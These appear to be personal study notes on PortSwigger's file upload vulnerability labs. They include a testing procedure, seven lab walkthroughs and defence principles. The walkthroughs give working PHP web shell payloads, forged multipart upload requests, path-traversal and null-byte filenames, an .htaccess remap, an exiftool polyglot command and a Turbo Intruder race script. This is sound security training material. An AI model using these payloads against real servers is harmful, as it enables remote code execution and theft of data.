# File Upload Vulnerabilities Notes — PortSwigger Web Security Academy

---

## WHAT ARE FILE UPLOAD VULNERABILITIES?

A file upload vulnerability exists when a web server allows users to
upload files without sufficiently validating their name, type, content, or
size. If an attacker can upload a SERVER-SIDE SCRIPT FILE (PHP, JSP, ASPX)
and get the server to EXECUTE it, the result is remote code execution
(RCE) — arguably the most severe outcome possible in web security.

```
Normal (intended) use:      upload a profile picture (.jpg, .png)
Malicious use:               upload a .php file containing attacker code
If the server executes it:   RCE — full control over server-side logic
```

> 📝 This module is the most direct path to RCE covered anywhere in the
> Academy. Every other module in this curriculum is about reading data,
> bypassing checks, or forging tokens. This one is about getting your own
> CODE to run on the target's server. That's why file upload findings are
> almost always rated critical in bug bounty — the impact ceiling is "the
> attacker now controls the application."

---

## THE TWO CONDITIONS NEEDED FOR RCE VIA FILE UPLOAD

For a file upload to lead to RCE, BOTH of these must be true:

1. **You can get a script file onto the server** (bypass whatever
   name/type/content validation exists)
2. **The server will EXECUTE that file when requested** (the upload
   directory must be configured to run scripts, not just serve them as
   static content)

If only condition 1 is true, you've achieved a (less severe) STORED file
— useful for other attacks (stored XSS via an uploaded HTML/SVG file,
disk exhaustion, path traversal into other files) but not direct RCE.

---

## VALIDATION MECHANISMS AND HOW EACH ONE FAILS

### 1. No validation at all
The server accepts and executes literally any uploaded file. Simply
upload a script directly.

### 2. Content-Type header check
The server inspects the `Content-Type` MIME header sent WITH the file in
the multipart form data — but this header is entirely CLIENT-CONTROLLED.
Just change it to `image/jpeg` (or whatever's expected) regardless of the
file's actual content.

> 📝 Never trust ANY client-controlled header for a security decision —
> this is the exact same lesson from the CORS and Access Control modules,
> just applied to file uploads. `Content-Type` is a claim the client
> makes about itself, not a verified fact.

### 3. File extension blacklist
The server rejects a list of "known dangerous" extensions (`.php`, `.php5`,
`.phtml`, etc.). Blacklists are ALWAYS incomplete — there's usually some
extension the developer forgot that the underlying web server STILL
treats as executable (a classic case: `.php` blocked, but the server's
config still executes `.phar`, `.php3`, `.pht`, or similar).

Blacklists can also potentially be bypassed via server MISCONFIGURATION —
for example, if a web server allows an uploaded `.htaccess` file to be
processed, and `.htaccess` files aren't themselves blacklisted, you can
upload a `.htaccess` that reconfigures the server to execute an
otherwise-blocked extension as PHP.

### 4. File extension obfuscation opportunities
Even a THOROUGH blacklist can be bypassed with classic obfuscation
techniques, if the validation and the eventual EXECUTION logic disagree
about what the "real" extension is:

| Technique | Example | Why it works |
|---|---|---|
| Case variation | `exploit.pHp` | Validation is case-sensitive; execution mapping isn't |
| Multiple extensions | `exploit.php.jpg` | Different components parse "the extension" differently — one may take the LAST segment, another the FIRST |
| Trailing characters | `exploit.php.` (trailing dot) | Some filesystems/components strip trailing dots/whitespace before use |
| URL-encoded characters | `exploit.p%68p` | If decoded AFTER the extension check but used raw beforehand |
| Null byte | `exploit.php%00.jpg` | Legacy C-string handling stops reading at the null byte, discarding everything after it — same technique as Path Traversal Lab 06 |

### 5. File content / "magic bytes" validation
The most robust check covered in this module: the server actually reads
the file's CONTENT to confirm it matches the claimed image format (e.g.
checking for the PNG/JPEG magic byte signature at the start of the file).

**Bypass — polyglot files:** Using a tool like `exiftool`, you can embed
arbitrary text (including PHP code) into an image's METADATA (its EXIF
comment field, for example) while the file remains a 100% valid,
genuine image at the byte-signature level. The magic-byte check passes
because the file IS a real image — your payload just also happens to be
readable as PHP when the server later interprets it as a script (if you
can get it saved/renamed with a `.php` extension, or if the server
executes ANY file in the upload directory regardless of extension).

```
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" \
  original.jpg -o polyglot.php
```

> 📝 The word "polyglot" here means the same file is simultaneously valid
> as TWO different formats — a real image AND executable PHP — depending
> on which parser interprets it. This is a genuinely elegant technique:
> you're not tricking a validation check into missing something, you're
> handing it something that's TRUTHFULLY a valid image, while ALSO being
> something else entirely to a different interpreter downstream.

### 6. Path traversal in the filename field
Some upload implementations use the CLIENT-SUPPLIED filename directly to
determine where the file gets saved on disk. If the server prevents
SCRIPT EXECUTION specifically inside the upload directory (e.g.
`/files/avatars/`) but doesn't do so for its PARENT directory
(`/files/`), a path traversal sequence in the filename can save your
script OUTSIDE the execution-restricted directory, where it WILL run.

```
filename = ../exploit.php
→ saves to /files/exploit.php instead of /files/avatars/exploit.php
→ /files/ doesn't have the same execution restriction → RCE
```

### 7. Race conditions
Some "strong" validation actually happens AFTER the file is already
physically written to disk — the server uploads first, THEN checks it,
THEN deletes it if invalid. This creates a brief WINDOW where a malicious
file sits on disk, fully accessible, before being removed. If you can
request the file (triggering execution) during that window, the
deletion happening moments later doesn't matter — your code already ran.

**Exploiting this requires SPEED** — sending the malicious upload and a
flood of requests attempting to access/execute it, all essentially
simultaneously, so that at least one access attempt lands inside the
narrow validate-then-delete window.

---

## FILE UPLOAD TESTING SOP

### Step 1 — Understand the upload mechanism
- What file types does the UI claim to accept?
- Where does the uploaded file end up? (Check the resulting URL after a
  normal, legitimate upload)
- Is the upload directory the SAME directory that serves other static
  content, or a dedicated one?

### Step 2 — Try uploading a script file directly
- Simple `.php` (or `.jsp`/`.aspx` depending on the stack) containing a
  minimal payload
- If accepted and executable → done, no bypass needed at all

### Step 3 — If blocked, identify WHAT is being checked
Test systematically:
1. Change `Content-Type` in the multipart body to `image/jpeg` — does that alone work?
2. Try alternative/obscure extensions (`.php5`, `.phtml`, `.phar`, `.pht`)
3. Try case variation (`.pHp`)
4. Try double extensions (`.php.jpg`)
5. Try a null byte (`.php%00.jpg`)
6. Try a trailing character (`.php.`, `.php ` with trailing space)

### Step 4 — If content is validated, try a polyglot
Use ExifTool (or similar) to embed a PHP payload into a genuinely valid
image's metadata, then get it saved/served with a `.php` extension.

### Step 5 — Check for path traversal in the filename
Try `../exploit.php` as the filename — see if it lands somewhere with
different execution permissions than the intended upload directory.

### Step 6 — Check for race conditions
If validation seems genuinely robust against every technique above,
consider whether validation might happen AFTER the file is briefly
written to disk. Test by rapidly uploading + requesting in parallel.

### Step 7 — Confirm execution, then escalate
Once your script executes, use it to read sensitive files, and consider
whether it can be extended into a full interactive web shell for further
exploitation.

---

## QUICK BURP WORKFLOW

1. Perform a normal, legitimate file upload with Burp running — capture
   the exact multipart request shape and note where the resulting file
   ends up (check Proxy > HTTP history for the subsequent GET request)
2. Send the upload request to **Repeater** — this becomes your base for
   all bypass attempts
3. Systematically vary: `Content-Type` header, filename extension,
   file content — resending after each change
4. For extension fuzzing, send to **Intruder** with a payload position
   inside the filename, and a wordlist of extensions/obfuscation variants
5. For polyglot files, prepare the file LOCALLY with ExifTool first, then
   upload it via Repeater/browser like any normal file
6. For race conditions, install the **Turbo Intruder** extension (BApp
   Store) — its concurrent request engine with a "gate" mechanism lets
   you release a POST upload and multiple GET requests to fetch it
   virtually simultaneously, maximising your chance of hitting the
   validate-then-delete window

> 📝 **Turbo Intruder** is purpose-built for race condition exploitation
> in a way normal Burp Intruder isn't — its `gate` mechanism holds the
> FINAL BYTE of multiple queued requests back until you explicitly release
> them all at once (`openGate`), meaning requests that would normally be
> sent slightly apart in time instead land on the server within
> milliseconds of each other. This is genuinely useful far beyond this
> one lab — race conditions get their own dedicated Academy module later.

---
---

## PORTSWIGGER LABS

---

### #01 — Remote code execution via web shell upload

**URL:** https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload
**Vulnerability:** The avatar upload feature performs NO validation whatsoever on the uploaded file
**Aim:** Upload a basic PHP web shell and use it to exfiltrate `/home/carlos/secret`

**Background:**
The simplest possible case in this module. Whatever file you upload as
your avatar is stored and served exactly as-is, with the server willing
to execute it if it's a script.

**Analysis:**
```
exploit.php:
  <?php echo file_get_contents('/home/carlos/secret'); ?>

Upload exploit.php as avatar
→ 200 OK, no validation error

GET /files/avatars/exploit.php
→ 200 OK — the PHP EXECUTES, returning carlos's secret directly
```

**Payload used:** a one-line PHP file reading and echoing the target
secret file's contents.

> 📝 This is the baseline every other lab in this module builds on —
> every subsequent lab is this SAME exploit, with one additional defence
> layered on top that you need to bypass first.

---

### #02 — Web shell upload via Content-Type restriction bypass

**URL:** https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass
**Vulnerability:** The server checks the `Content-Type` header of the uploaded file — a value the CLIENT fully controls
**Aim:** Upload a basic PHP web shell and exfiltrate `/home/carlos/secret`

**Background:**
Uploading `exploit.php` directly is rejected — the server states only
JPG/PNG files are allowed, based on the `Content-Type` header in the
multipart upload. But that header is set by the CLIENT, not verified
against the actual file content.

**Analysis:**
```
POST /my-account/avatar
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
→ REJECTED: "invalid file type"

Change Content-Type to image/jpeg (file content unchanged):
POST /my-account/avatar
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
→ 200 OK — accepted, uploaded as exploit.php

GET /files/avatars/exploit.php
→ 200 OK — executes, returns carlos's secret
```

**Payload used:** same PHP payload as Lab 01, with `Content-Type:
image/jpeg` forged in the multipart body.

> 📝 The `Content-Type` in a multipart/form-data upload is exactly as
> trustworthy as any other client-supplied header — which is to say, not
> at all, for security purposes. It's metadata the CLIENT asserts about
> its own data; the server must independently verify the CONTENT if it
> wants that claim to mean anything.

---

### #03 — Web shell upload via path traversal

**URL:** https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal
**Vulnerability:** The server prevents SCRIPT EXECUTION specifically within `/files/avatars/`, but not within its parent `/files/` directory — and the filename field is used unsanitised to determine the save path
**Aim:** Upload a basic PHP web shell and exfiltrate `/home/carlos/secret`

**Background:**
A normal `.php` upload succeeds and is saved to `/files/avatars/`, but
visiting it returns the RAW PHP SOURCE as plain text instead of
executing it — this specific directory has execution disabled. However,
using a filename with a path traversal sequence causes the file to be
saved one directory UP, outside that restriction.

**Analysis:**
```
Upload exploit.php normally
GET /files/avatars/exploit.php
→ 200 OK, but returns the raw PHP CODE as text (not executed)

Re-upload with filename set to: ../exploit.php
(the filename field in the multipart Content-Disposition header)

→ saves to /files/exploit.php instead of /files/avatars/exploit.php

GET /files/exploit.php
→ 200 OK — NOW it executes, returning carlos's secret
   (the parent /files/ directory has no execution restriction)
```

**Payload used:** filename `../exploit.php` in the multipart
`Content-Disposition` header, containing the standard PHP payload.

> 📝 This is the exact same path traversal PRIMITIVE from the dedicated
> Path Traversal module — just applied to a filename field controlling a
> SAVE location instead of a filename field controlling a READ location.
> Whenever client input determines WHERE a file gets written, always test
> whether it can escape the intended directory.

---

### #04 — Web shell upload via extension blacklist bypass

**URL:** https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass
**Vulnerability:** The extension blacklist is missing `.htaccess`, and the server (Apache) will process an uploaded `.htaccess` file, allowing you to reconfigure the upload directory to execute a normally-blocked extension as PHP
**Aim:** Upload a basic PHP web shell and exfiltrate `/home/carlos/secret`

**Background:**
The blacklist blocks `.php` and its common variants. But `.htaccess`
(Apache's per-directory configuration file) isn't on the list — and
Apache will happily process one if it's present in a directory it
serves. By uploading a `.htaccess` file that instructs Apache to treat a
DIFFERENT (unblocked) extension as executable PHP, you sidestep the
blacklist entirely.

**Analysis:**
```
First, identify the server: check any Response header for "Server:
Apache/2.4.41 (Ubuntu)" (or similar) — confirms Apache, which honours
per-directory .htaccess files by default.

Upload a file named .htaccess containing:
  AddType application/x-httpd-php .l33t

→ 200 OK — .htaccess itself isn't blacklisted, gets saved normally

Now upload a file named exploit.l33t (an extension NOT on the blacklist)
containing the standard PHP payload:
  <?php echo file_get_contents('/home/carlos/secret'); ?>

→ 200 OK — .l33t isn't blacklisted either

GET /files/avatars/exploit.l33t
→ 200 OK — Apache now treats .l33t as PHP (per our .htaccess directive)
   and EXECUTES it, returning carlos's secret
```

**Payload used:** a `.htaccess` file remapping an arbitrary extension to
PHP execution, followed by the payload file using that new extension.

> 📝 This is a great example of exploiting infrastructure-level
> configuration rather than the application's own validation logic
> directly. The blacklist was actually doing its job against every
> extension IT knew about — the vulnerability was in what it DIDN'T know
> to block: a file that lets you REDEFINE what "executable" even means
> for that directory.

---

### #05 — Web shell upload via obfuscated file extension

**URL:** https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension
**Vulnerability:** The extension blacklist is thorough, but it's bypassed using classic filename obfuscation — a double extension combined with a null byte
**Aim:** Upload a basic PHP web shell and exfiltrate `/home/carlos/secret`

**Background:**
Every direct PHP extension variant is blocked (`.php`, `.php5`, `.phtml`,
etc.). But the underlying validation and the SAVE logic disagree about
where the "real" extension is — appending `.jpg` after `.php`, combined
with a null byte to truncate the string during the actual save, lets the
file be validated as a JPG while being SAVED with a `.php` name.

**Analysis:**
```
Upload exploit.php → BLOCKED (blacklisted extension)
Upload exploit.php.jpg → accepted, but saved AS exploit.php.jpg (not executable)

Combine with a null byte, inserted between the two extensions:
  filename: exploit.php%00.jpg

→ Extension validation sees the string ending in ".jpg" → passes
→ The underlying save operation stops reading the filename at the
  null byte (legacy C-string behaviour) → actually saves as: exploit.php

GET /files/avatars/exploit.php
→ 200 OK — executes, returns carlos's secret
```

**Payload used:** filename `exploit.php%00.jpg` (null byte between the
real and fake extensions) in the multipart `Content-Disposition` header.

> 📝 This is the SAME null byte technique as Path Traversal Lab 06's
> extension bypass — the exact same underlying legacy string-handling
> quirk, just applied to a file UPLOAD's save-name validation instead of
> a file DOWNLOAD's read-path validation. Recognising a technique once
> means recognising it everywhere it recurs.

---

### #06 — Remote code execution via polyglot web shell upload

**URL:** https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload
**Vulnerability:** The server validates the uploaded file's ACTUAL CONTENT to confirm it's a genuine image — but doesn't account for image METADATA fields being able to contain arbitrary data
**Aim:** Upload a basic PHP web shell and exfiltrate `/home/carlos/secret`

**Background:**
The most robust validation seen in this module — the server genuinely
checks that uploaded files are real images at the byte level. A plain
PHP file is rejected outright. The bypass: create a POLYGLOT file — a
100% valid, genuine JPG image that ALSO contains a PHP payload hidden in
its EXIF metadata (the Comment field), then get that file saved/executed
with a `.php` extension.

**Analysis:**
```
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" \
  original.jpg -o polyglot.php

→ This produces polyglot.php: a byte-for-byte valid JPG (passes any
  magic-byte/content check) that also contains our PHP payload inside
  its Comment metadata field, saved with a .php extension.

Upload polyglot.php as avatar
→ 200 OK — passes content validation (it IS a real image)

GET /files/avatars/polyglot.php
→ 200 OK — served AS the raw image bytes, but PHP-parsed by the server
  because of its .php extension. The PHP interpreter finds our
  <?php ... ?> tags embedded in the EXIF comment and executes them,
  amid all the surrounding binary image data.

  Search the (mostly binary) response for the literal string "START" —
  carlos's secret appears between "START " and " END".
```

**Payload used:** `exiftool -Comment="<?php echo 'START ' .
file_get_contents('/home/carlos/secret') . ' END'; ?>" <input>.jpg -o
polyglot.php`

**Requires:** ExifTool installed locally.

> 📝 The `START`/`END` markers in the payload aren't decorative — they're
> essential for FINDING your output. The response body is mostly raw
> binary image data; without clear text markers to search for, spotting
> your payload's output amid that binary noise would be far harder. This
> is a small but genuinely useful technique: when your output will be
> embedded in otherwise-unpredictable content, wrap it in a unique,
> greppable delimiter.

---

### #07 — Web shell upload via race condition

**URL:** https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition
**Vulnerability:** File validation happens AFTER the uploaded file is already written to disk — the server uploads first, checks second, deletes if invalid — creating a brief window where a malicious file is live and executable
**Aim:** Upload a basic PHP web shell and exfiltrate `/home/carlos/secret`

**Background:**
Every technique from the previous six labs is blocked here — this
server's validation is genuinely thorough. But the IMPLEMENTATION has a
timing flaw: `move_uploaded_file()` writes the file to disk FIRST, and
only THEN runs `checkViruses()` / `checkFileType()` checks, deleting the
file if it fails. Between the write and the delete, the file is fully
present and executable.

**Analysis:**
```
Vulnerable server-side logic (disclosed via the lab's hint):
  move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);
  if (checkViruses($target_file) && checkFileType($target_file)) {
      echo "The file is valid.";
  } else {
      unlink($target_file);   // deletes AFTER already being live briefly
  }

Exploit using Turbo Intruder (handles the required speed/concurrency):

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10)
    request1 = '''<YOUR-POST-UPLOAD-REQUEST-WITH-exploit.php>'''
    request2 = '''<YOUR-GET-REQUEST-FOR-/files/avatars/exploit.php>'''

    # 'gate' holds the final byte of every queued request back until
    # openGate() releases them all at (near) the exact same instant
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)

→ The single POST upload request and five simultaneous GET requests
  (attempting to fetch/execute exploit.php) all fire within
  milliseconds of each other.
→ At least one of the GET requests lands DURING the brief window after
  the file was written but BEFORE validation deleted it.
→ That GET response contains carlos's secret, exfiltrated by the
  PHP payload executing during its brief window of existence.
```

**Payload used:** standard PHP payload (`exploit.php`), delivered via a
Turbo Intruder script that races one upload POST against five parallel
fetch GETs, released simultaneously via the `gate`/`openGate` mechanism.

**Requires:** the Turbo Intruder Burp extension (BApp Store).

> 📝 This lab is the Academy's introduction to race condition
> exploitation — a technique important enough to get its OWN dedicated
> module later in the curriculum. The core insight: "the server validates
> this" is not the same claim as "the server validates this BEFORE it
> becomes accessible." Any time validation happens as a separate step
> AFTER an action has already taken effect, a timing window exists — and
> real-world race windows are often mere milliseconds, which is exactly
> why a tool built for high-concurrency, precisely-timed request bursts
> (Turbo Intruder) is necessary rather than sending requests one at a time.

---

## REFERENCE — FILE UPLOAD VULNERABILITY QUICK MAP

| Lab pattern | What's broken | Fix |
|---|---|---|
| No validation | Nothing checked at all | Validate type, content, size, and name; never trust any of these blindly |
| Content-Type check only | Trusting a client-controlled header | Verify actual file CONTENT, never rely on client-asserted metadata |
| Path traversal in filename | Filename used unsanitised to determine save location | Generate save filenames server-side; never derive paths from client input |
| Extension blacklist gap (.htaccess) | Blacklist incomplete; didn't account for config files | Use an ALLOW-list of extensions, never a blacklist; disable directory-level config overrides in the upload directory |
| Obfuscated extension (double ext + null byte) | Validation and save logic disagree about "the" extension | Canonicalise and validate the FINAL extension only, after all decoding; reject ambiguous filenames outright |
| Polyglot content | Magic-byte check alone doesn't account for metadata-embedded payloads | Strip/regenerate all metadata from uploaded images; never execute uploaded files regardless of validation passing |
| Race condition | Validation happens after the file is already live on disk | Validate BEFORE writing to a publicly-accessible location, or write to a non-executable temp location first |

---

## REFERENCE — DEFENCE PRINCIPLES

1. **Never execute uploaded files, period** — store them outside the web
   root, or in a location explicitly configured to never execute scripts,
   regardless of extension
2. **Use an allow-list of extensions, never a blacklist** — blacklists
   are inherently incomplete; explicitly permitting only known-safe
   extensions closes off the entire obfuscation category of bypass
3. **Rename uploaded files server-side** — never use the client-supplied
   filename to determine the storage path or name; generate a new,
   random, extensionless (or fixed-extension) identifier instead
4. **Validate actual file CONTENT, not just headers or extensions** —
   verify magic bytes AND consider stripping/regenerating metadata that
   could hide a payload
5. **Validate BEFORE the file becomes accessible, not after** — never
   write an unvalidated file to a location the web server will serve;
   validate in a private staging location first
6. **Disable directory-level configuration overrides** (like Apache's
   `AllowOverride`) **in any upload directory** — an uploaded `.htaccess`
   (or equivalent) should never be able to change how that directory is
   served
7. **Set restrictive file size and rate limits** — even without RCE, an
   unrestricted upload feature can be abused for storage exhaustion or
   denial of service
